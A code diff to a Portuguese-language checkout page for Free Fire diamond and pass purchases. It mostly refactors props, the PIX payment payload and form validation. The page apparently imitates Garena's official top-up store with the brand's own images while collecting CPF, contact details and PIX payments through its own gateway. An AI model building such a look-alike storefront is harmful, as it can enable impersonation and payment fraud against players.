@@ -13,6 +13,7 @@ import { zodResolver } from '@hookform/resolvers/zod';
 import * as z from 'zod';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { useToast } from "@/hooks/use-toast";
+import { useRouter } from 'next/navigation';
 import { type KeyboardEvent } from 'react';
 import { cn } from '@/lib/utils';
 import { Sheet, SheetContent } from '@/components/ui/sheet';
@@ -46,7 +47,7 @@ const diamondPacks = [
 ];
 
 const specialOffers = [
-    { id: 'offer-weekly-sub', name: 'Assinatura Semanal', image: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/000/002/logo.png', price: '19.99', priceFormatted: 'R$ 19,99', amount: '1.000', bonus: '300', productDescription: 'Assinatura Semanal' },
+    { id: 'offer-weekly-sub', name: 'Assinatura Semanal', image: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/00/002/logo.png', price: '19.99', priceFormatted: 'R$ 19,99', amount: '1.000', bonus: '300', productDescription: 'Assinatura Semanal' },
     { id: 'offer-monthly-sub', name: 'Assinatura Mensal', image: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/081/041/logo.png', price: '32.90', priceFormatted: 'R$ 32,90', amount: '2.000', bonus: '600', productDescription: 'Assinatura Mensal' },
     { id: 'offer-booyah-pass', name: 'Passe Booyah', image: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/item/0803/000/000/logo.png', price: '19.99', priceFormatted: 'R$ 19,99', amount: '1.000', bonus: 'Passe Booyah', productDescription: 'Passe Booyah' },
     { id: 'offer-level-pack', name: 'Passe de Nível', image: 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/rebate/0000/004/790/logo.png', price: '74.80', priceFormatted: 'R$ 74,80', amount: '7.800', bonus: '5.600', productDescription: 'Passe de Nível' }
@@ -61,7 +62,7 @@ const paymentMethods = [
   { id: 'payment-cc-hipercard', name: 'Hipercard', displayName: 'Cartão de Crédito via PagSeguro (Aprovação, em média, imediata)', image: 'https://payment.boacompra.com/images-novo/layout/cartoes/hipercard-2019.png', type: 'cc' },
 ];
 
-function CheckoutPage() {
+export default function CheckoutPage() {
     const [isMounted, setIsMounted] = useState(false);
     const [playerName, setPlayerName] = useState('');
     const [playerId, setPlayerId] = useState('');
@@ -155,7 +156,7 @@ function CheckoutPage() {
                 <div className="flex flex-col gap-9 px-2 lg:px-0">
                   <div>
                     <div id="denom-section" className="mb-3 flex scroll-mt-16 items-center gap-2 text-lg/none font-bold text-gray-800 md:text-xl/none">
-                      <StepMarker number="2" />
+                      <StepMarker number="1" />
                       Valor de Recarga
                     </div>
                     <Tabs defaultValue="buy" className="w-full">
@@ -223,7 +224,7 @@ function CheckoutPage() {
 
                   <div>
                     <div id="channel-section" className="mb-3 flex scroll-mt-36 items-center gap-2 text-lg/none font-bold text-gray-800 md:text-xl/none">
-                      <StepMarker number="3" />
+                      <StepMarker number="2" />
                       <div>Método de pagamento</div>
                     </div>
                     <div role="radiogroup" className="grid grid-cols-2 gap-2.5 md:grid-cols-3 md:gap-4">
@@ -302,10 +303,11 @@ function CheckoutPage() {
       <CheckoutSheet 
         isOpen={isSheetOpen}
         onOpenChange={setIsSheetOpen}
-        view={view}
-        setView={setView}
+        view={sheetView}
+        setView={setSheetView}
         selectedItem={selectedItem}
         playerName={playerName}
+        playerId={playerId}
         onPixGenerated={setPixData}
         pixData={pixData}
       />
@@ -348,7 +350,7 @@ const checkoutFormSchema = z.object({
 });
 
 
-const CheckoutSheet = ({ isOpen, onOpenChange, view, setView, selectedItem, playerName, onPixGenerated, pixData }: any) => {
+const CheckoutSheet = ({ isOpen, onOpenChange, view, setView, selectedItem, playerName, playerId, onPixGenerated, pixData }: any) => {
     const handleBackToForm = () => setView('form');
 
     return (
@@ -358,6 +360,7 @@ const CheckoutSheet = ({ isOpen, onOpenChange, view, setView, selectedItem, play
                     <CheckoutForm 
                         selectedItem={selectedItem} 
                         playerName={playerName}
+                        playerId={playerId}
                         onSuccess={(data: any) => {
                             onPixGenerated(data);
                             setView('pix');
@@ -377,9 +380,10 @@ const CheckoutSheet = ({ isOpen, onOpenChange, view, setView, selectedItem, play
     );
 };
 
-const CheckoutForm = ({ selectedItem, playerName, onSuccess }: any) => {
+const CheckoutForm = ({ selectedItem, playerName, playerId, onSuccess }: any) => {
     const { toast } = useToast();
     const [isSubmitting, setIsSubmitting] = useState(false);
+    const router = useRouter();
 
     const form = useForm<z.infer<typeof checkoutFormSchema>>({
         resolver: zodResolver(checkoutFormSchema),
@@ -398,11 +402,14 @@ const CheckoutForm = ({ selectedItem, playerName, onSuccess }: any) => {
         setIsSubmitting(true);
         try {
             const payload = {
-                name: values.name,
-                email: values.email,
-                phone: values.phone.replace(/\D/g, ''),
-                cpf: values.cpf.replace(/\D/g, ''),
+                customer: {
+                    name: values.name,
+                    email: values.email,
+                    phone: values.phone.replace(/\D/g, ''),
+                    document: values.cpf.replace(/\D/g, ''),
+                },
                 amount: parseFloat(selectedItem.price.replace(',', '.')),
+                paymentMethod: "PIX",
                 externalId: `ff-${Date.now()}`,
                 items: [{
                     unitPrice: parseFloat(selectedItem.price.replace(',', '.')),
@@ -451,7 +458,7 @@ const CheckoutForm = ({ selectedItem, playerName, onSuccess }: any) => {
                 <dl className="p-6 space-y-4 text-sm">
                     <div className="flex justify-between">
                         <dt className="text-gray-600">Jogador</dt>
-                        <dd className="font-medium text-gray-800">{playerName}</dd>
+                        <dd className="font-medium text-gray-800">{playerName} ({playerId})</dd>
                     </div>
                     <div className="flex justify-between">
                         <dt className="text-gray-600">Produto</dt>
@@ -469,7 +476,7 @@ const CheckoutForm = ({ selectedItem, playerName, onSuccess }: any) => {
                            <FormField control={form.control} name="email" render={({ field }) => (<FormItem><FormLabel>E-mail</FormLabel><FormControl><Input {...field} type="email" placeholder="seu@email.com" /></FormControl><FormMessage /></FormItem>)} />
                            <FormField control={form.control} name="cpf" render={({ field }) => (<FormItem><FormLabel>CPF</FormLabel><FormControl><Input {...field} placeholder="000.000.000-00" onChange={(e) => handleMaskedChange(e, field.onChange, cpfMask)}/></FormControl><FormMessage /></FormItem>)} />
                            <FormField control={form.control} name="phone" render={({ field }) => (<FormItem><FormLabel>Telefone</FormLabel><FormControl><Input {...field} placeholder="(00) 00000-0000" onChange={(e) => handleMaskedChange(e, field.onChange, phoneMask)}/></FormControl><FormMessage /></FormItem>)} />
-                           <Button type="submit" className="w-full h-11 text-base mt-6" variant="destructive" disabled={isSubmitting}>
+                           <Button type="submit" className="w-full h-11 text-base mt-6" variant="destructive" disabled={isSubmitting || !form.formState.isValid}>
                             {isSubmitting ? "Processando..." : "Prosseguir para pagamento"}
                            </Button>
                         </form>
@@ -482,6 +489,8 @@ const CheckoutForm = ({ selectedItem, playerName, onSuccess }: any) => {
 
 const PixDisplay = ({ pixData, selectedItem, playerName, onBack }: any) => {
     const { toast } = useToast();
+    const router = useRouter();
+
     const handleCopyCode = () => {
         if (navigator.clipboard && pixData.pixCode) {
             navigator.clipboard.writeText(pixData.pixCode);
@@ -491,6 +500,7 @@ const PixDisplay = ({ pixData, selectedItem, playerName, onBack }: any) => {
             });
         }
     };
+    
     return (
       <div className="flex flex-col h-full bg-gray-50">
           <div className="p-4 border-b bg-white flex items-center">
